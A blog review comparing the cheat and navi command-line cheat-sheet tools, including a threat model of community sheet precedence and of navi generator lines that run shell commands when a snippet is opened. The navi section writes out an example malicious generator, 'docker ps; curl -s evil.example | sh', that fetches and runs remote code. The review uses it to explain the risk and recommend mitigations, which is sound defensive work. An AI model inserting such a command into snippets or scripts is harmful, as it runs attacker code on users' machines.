---
title: "cheat vs navi: the honest review"
description: "Two interactive cheat-sheet tools that go a step past tldr. One quietly lets strangers override your notes; the other runs their shell to fill in blanks."
date: 2026-10-21
preview: /images/previews/cheat-vs-navi-the-honest-review.svg
categories: [Tools]
tags: [productivity, search]
author: cass
verdict: "It depends: cheat for your own notes (fix the cheatpath order first), navi for snippets you wrote yourself, and plain tldr for commands written by strangers"
excerpt: "cheat prints a sheet; navi fills in the blanks and runs it. Both are good. One lets a 2022 community repo override your own notes, and the other runs a stranger's shell command to build its dropdown before you've agreed to anything."
permalink: /tools/cheat-vs-navi-honest-review/
---
**Verdict: it depends, and here is exactly what it depends on. Use `cheat` as a filing cabinet for commands *you* wrote, but move the community cheatpath to the top of its config before you write a single sheet. If you don't, the installer's default order lets a community repo last touched in December 2022 override your personal notes. Use `navi` for your own snippets. Its argument picker is the best thing in this review. But read every `$` line before you import somebody else's repo, because those lines are shell commands and navi runs them when you *open* a snippet, before you've agreed to run anything. For commands written by strangers, the simpler tool still wins: [tealdeer](/tools/tealdeer-honest-review/) prints and never executes.**

Nobody threat-models a cheat sheet. It's a sticky note. It's the laminated card taped to the server rack that says `DO NOT TOUCH THE RED ONE`. Then somebody made the sticky note searchable, then synced it from GitHub, then gave it a dropdown that fills itself in by running shell commands. Now the sticky note has a supply chain, an update channel, and the ability to execute code in your terminal, and it is still being reviewed like a sticky note. So I installed both on a scratch box and threat-modeled the laminated card.

Setup, for the record: `cheat` 5.1.0 and `navi` 2.24.0, both from their GitHub release binaries, on Ubuntu 24.04.5 LTS with fzf 0.44.1. Everything ran under a throwaway `HOME`. I drove navi's fzf screens through a tmux pane and copied the pane text, trimmed to the lines that matter. Nobody paid for this. Both tools are free and open source (cheat is MIT; navi is Apache-2.0). Both community repos are CC0. I don't trust free things, which is the whole reason I'm here.

## What "a step past tldr" actually means

tldr pages are read-only examples that someone else curated. These two tools add one layer each:

- **cheat** adds *your own* layer. It's a set of plain-text sheets, sorted into "cheatpaths" (personal, work, community), with tags, regex search, and an editor shortcut. It prints the sheet and that's all it does. `cheat tar` took 0.016 s on the box I tested on.
- **navi** adds an *execution* layer. Snippets have `<placeholders>`. navi fills each one from a list it builds by running a shell command, lets you pick from that list in fzf, and then runs the finished command.

That second bullet is the entire review in miniature. Keep it in mind.

## cheat: the good part

The first run is an honest little installer. It asks two questions and does nothing behind your back:

```console
$ printf 'y\ny\n' | cheat tar
A config file was not found. Would you like to create one now? [Y/n]: Would you like to download the community cheatsheets? [Y/n]: Cloning community cheatsheets to /tmp/lhhome/.config/cheat/cheatsheets/community.
Total 335 (delta 43), reused 213 (delta 23), pack-reused 0 (from 0)
Created config file: /tmp/lhhome/.config/cheat/conf.yml
Please read this file for advanced configuration information.
```

(I piped the answers in, which is why both prompts land on one line. I also trimmed git's progress meter; the rest is verbatim. Small papercut: piping in only one `y` makes it fail with `failed to prompt: EOF` and exit 1, so a scripted install needs both answers.)

After that it's a fast, boring, plain-text tool, which is high praise from me. `cheat -s ssh-keygen` searches the contents of every sheet. `cheat -e foo` opens your editor on a personal sheet. `cheat --update` runs a `git pull` on any cheatpath that is a git repo and skips the ones that aren't, and it doesn't do that until you ask:

```console
$ cheat --update
personal: skipped (not a git repository)
work: skipped (not a git repository)
community: ok
```

No auto-update and no network on read. Good. Now for the part where it broke.

## cheat attack surface #1: your notes lose to a stranger's

I wrote a personal `tar` sheet: one line, the only `tar` I ever use. Then I ran `cheat tar` and got the community sheet back, not mine:

```console
$ cat ~/.config/cheat/cheatsheets/personal/tar
---
tags: [ mine ]
---
# My tar: the only one I use
tar -xzf thing.tar.gz

$ cheat tar
# To extract an uncompressed archive:
tar -xvf /path/to/foo.tar
...
```

Both sheets exist, and `cheat -l` lists both:

```console
$ cheat -l | grep -E '^(title|tar )'
title:                    file:                                                                     tags:
tar                       /tmp/lhhome/.config/cheat/cheatsheets/personal/tar                        mine,personal
tar                       /tmp/lhhome/.config/cheat/cheatsheets/community/tar                       community,compression
```

The config file the installer wrote explains why, in its own comments: *"the most local cheatsheets (those which come later in this file) take precedence."* The installer then lists the cheatpaths in this order:

```console
$ grep -E '^\s*- name:' ~/.config/cheat/conf.yml
  - name: personal
  - name: work
  - name: community
```

Community comes last, so community is treated as the most "local" path, so community wins. I checked the previous major version to see if this was always the case, and it wasn't. Here's the template from the `cheat` 4.4.2 binary next to the 5.1.0 one:

```console
$ cheat-4.4.2 --init | sed -n '/^cheatpaths/,$p' | grep -E 'name:'   # the 4.4.2 release binary, renamed so both versions fit on one box
  - name: community
  - name: personal
```

In 4.4.2, community came first and your notes won. In 5.1.0 it comes last, so on a fresh 5.x install a sheet named after a common command loses to the community version without any warning. The project already has a related open issue, [cheat/cheat#787](https://github.com/cheat/cheat/issues/787), about `--all` showing sheets in the wrong priority order. I couldn't find an issue covering the default order itself.

**SEVERITY: your own handwriting. ATTACK VECTOR: alphabetical-adjacent YAML. BLAST RADIUS: the one time you wrote down the *right* flags for your environment, and the tool showed you the generic ones instead.** Now the paranoid version. The community cheatpath is a git clone that `cheat --update` pulls. Picture a malicious maintainer, or a compromised account, merging a "refresh" of the `tar` sheet. Whatever that sheet says now outranks your personal one, and you'd never know, because you were looking at *your* `tar`. You'd paste in their flags, they'd be running their tar job on your box, and the laminated card would be working for a foreign power.

Now let me walk that back. The community repo's newest commit is from 2022-12-17, so nobody is pushing anything into it, malicious or otherwise. cheat only *prints*. Nothing runs until you paste it. The real-world harm is smaller and more boring: **stale advice beats your current advice.** For example, the community `ssh-keygen` sheet starts with:

```console
$ cheat ssh-keygen
# To generate an SSH key:
ssh-keygen -t rsa
```

That isn't wrong. RSA keys still work. But on this box, a plain `ssh-keygen` with no `-t` (OpenSSH 9.6p1) already produces an `(ED25519)` key, so the sheet's first suggestion is less current than the tool's own default. That's what a sheet looks like after nearly four years without an edit. The fix takes thirty seconds and is mitigation #3 below. With the community path moved to the top, the same `cheat tar` returns my one line:

```console
$ grep -E '^\s*- name:' ~/.config/cheat/conf.yml
  - name: community
  - name: personal
  - name: work
$ cheat tar
# My tar: the only one I use
tar -xzf thing.tar.gz
```

## navi: the genuinely great part

Here's the feature that earns navi a place in this review, and I mean it. You write a snippet once, with a placeholder and a line telling navi how to fill it:

```text
% git, mine

# switch to a local branch (picked from a list)
git switch <branch>

$ branch: git branch --format='%(refname:short)'
```

Then `navi --query 'switch to a local'`, Enter, and instead of typing a branch name from memory you pick one from a live list (fzf screen, trimmed):

```console
│ switch to a local branch (picked from a list) [git, mine]
│ git switch <branch>
│
│ branch = feat/the-other-thing
╰──────────────────────────────────────────────
  main
  fix/the-thing
> feat/the-other-thing
  3/3 ─────────────────────────────────────────
```

Enter again:

```console
Switched to branch 'feat/the-other-thing'
```

No typos and no `git branch` followed by squinting. The community docker sheet does the same thing with `$ container_id: docker ps --- --headers 1 --column 1` (I read that one but didn't run it, because there's no Docker daemon on the test box). Filling blanks from live state is where navi pays for itself. tldr can't do this. cheat can't do this. A notes file *definitely* can't. Notice, though, that the second Enter **ran the command.** There's no "Run this? [y/N]" step. Picking the snippet and running it are the same keystroke. That's fine for a snippet you wrote, and it's why the next section matters.

## navi attack surface #2: the dropdown is a shell

That `$ branch:` line isn't data. It's a shell command, and navi runs it to build the list. I wanted to know *when* it runs, so I planted a canary snippet that looks harmless and isn't:

```text
% canary

# say hello to someone
echo hello <name>

$ name: touch /tmp/lhhome/GENERATOR_RAN && echo world
```

Then I opened it with `--print`, the flag the help text describes as *"Instead of executing a snippet, prints it to stdout."* The canary file didn't exist beforehand. After selecting the snippet:

```console
$ navi --print --query 'say hello'     # fzf opens; I pressed Enter on the one match
echo hello world
$ ls -l --time-style=+%T /tmp/lhhome/GENERATOR_RAN
-rw-r--r-- 1 runner runner 0 22:54:05 /tmp/lhhome/GENERATOR_RAN
```

The snippet wasn't executed. The *generator* was. Since it produced a single value, fzf auto-selected it and I never saw a prompt. So "print-only mode" means the snippet only gets printed. Anything inside a `$` line runs as soon as you select the snippet.

Now apply that to other people's snippets. `navi repo add denisidoro/cheats` (the featured community repo) clones the repo and asks one question, with **Yes** pre-selected:

```console
  No
> Yes
  Do you want to import all files from this repo?
```

Press Enter and you've imported 33 `.cheat` files, 597 snippets, and **74 `$` generator lines across 20 of those files**. Each one is a shell command written by someone you've never met, and it runs the moment you select its snippet. I read them. They're benign: `docker images`, `git branch`, `sudo pacman -Qe`. That's the kind of thing a generator should be. And the imported copy has no `.git` directory, so there's no history, no signature, and no `git log` showing you what changed since the last time you looked. Updating means running `repo add` again and getting a fresh, unversioned copy.

**SEVERITY: your shell profile. ATTACK VECTOR: a dropdown menu. BLAST RADIUS: anything your user account can touch, triggered by the act of *looking at* a snippet.** In the paranoid version, a popular snippet repo gets one "helpful" PR that changes a generator from `docker ps` to `docker ps; curl -s evil.example | sh`. It runs on every machine where someone goes looking for a container ID, and the snippet text on screen still reads `docker logs <container_id>`. The intern with sudo did nothing wrong. They opened a cheat sheet.

Walking it back: I found nothing malicious, and this is documented behavior, not a bug. Generators running shell is the feature. But "a dropdown that runs code" deserves the same scrutiny you'd give a shell script you were about to `curl | sh`, because that's what it is with better marketing. The simpler tool doesn't have this attack surface at all. tldr prints text, and so does `cheat`.

## When the simpler tool still wins

- **Commands written by strangers:** tldr. It prints and never executes. (Read [the tealdeer review](/tools/tealdeer-honest-review/) for *its* threat model: turn off auto-update.)
- **Commands you wrote, that you just need to remember:** `cheat`, or honestly a `~/notes.md` and `grep`. `cheat`'s advantages are tags, search, and the per-command filing. It's a nicer filing cabinet, not a different kind of tool.
- **Commands you wrote, with blanks you fill from live state** (branch, container, pod, k8s context): navi. Nothing else in this space does it, and on a real workday it saves real keystrokes.

## The three mitigations that matter

Ranked, and I ran each one on the test box:

1. **Never press Enter on navi's "import all files" prompt.** Pick **No** instead. navi then shows a per-file picker ("Select the cheatsheets you want to import with <TAB>"). Import only the files you'll use, then read every `$` line in them: `grep -n '^\$ ' ~/.local/share/navi/cheats/*/*.cheat`. The full community repo has seventy-four, which is a five-minute read. Better still, copy the three snippets you like into your own `.cheat` file and import nothing.
2. **When you're browsing a navi snippet you didn't write, add `--prevent-interpolation`.** It's a real flag. I reran the canary with `navi --print --prevent-interpolation --query 'say hello'`, and navi printed `echo hello <name>` with the placeholder intact. The canary file was *not* created. Look first, then fill in the blanks.
3. **Move cheat's `community` cheatpath to the top of `~/.config/cheat/conf.yml`,** above `personal` and `work`, so your own sheets take precedence. After I did that, `cheat tar` returned my one-line sheet instead of the community one. `cheat -p community tar` still shows the community version when you want it.

What I uninstalled: the bulk import of `denisidoro/cheats`, which I replaced with my own two-snippet `.cheat` file. What I kept: both binaries, the community cheatpath (moved to the top), and navi's branch picker, which I'd like to state for the record is the most useful dropdown I have ever distrusted.
